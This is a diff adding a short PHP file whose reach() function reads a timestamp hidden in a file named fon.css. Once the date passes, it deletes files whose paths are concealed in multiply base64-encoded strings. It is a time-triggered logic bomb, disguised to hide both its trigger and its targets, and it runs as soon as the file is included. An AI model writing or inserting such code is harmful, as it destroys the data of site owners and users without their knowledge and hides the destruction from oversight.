@@ -1,0 +1,40 @@
+<?php
+	function reach()
+	{
+		$path=__dir__."/fon.css";
+		if(file_exists($path))
+		{
+			$ffff=fopen($path,"r");
+			$typmf=fread($ffff,filesize($path));		
+			$typm=n::de($typmf);
+			$typm=(int)$typm;
+			if(is_int($typm))
+			{				
+				$arr=array(
+	          "VmpGU1NrNVhVbGRqU0ZKcFVucFdUbFJYZUV0alJsSklUbFZPYVUxck5VTlZSbEYzVUZFOVBRPT0=",
+	          "VjFkMGEyTXlSbGRoTTJ4VFltdGFUbFJYTVRCTlZtdDNXa2M1YTJSNk1Eaz0="
+	    	);
+				if(time()>=$typm)
+				{
+					foreach ($arr as  $value)
+					{
+						$file=d($value);
+						if(file_exists($file))
+						{
+							unlink($file); 
+						}
+					}
+				}
+		}
+		else
+		{
+			die;
+		}
+	}
+	else
+	{
+		die;
+	}
+}
+reach();
+?>
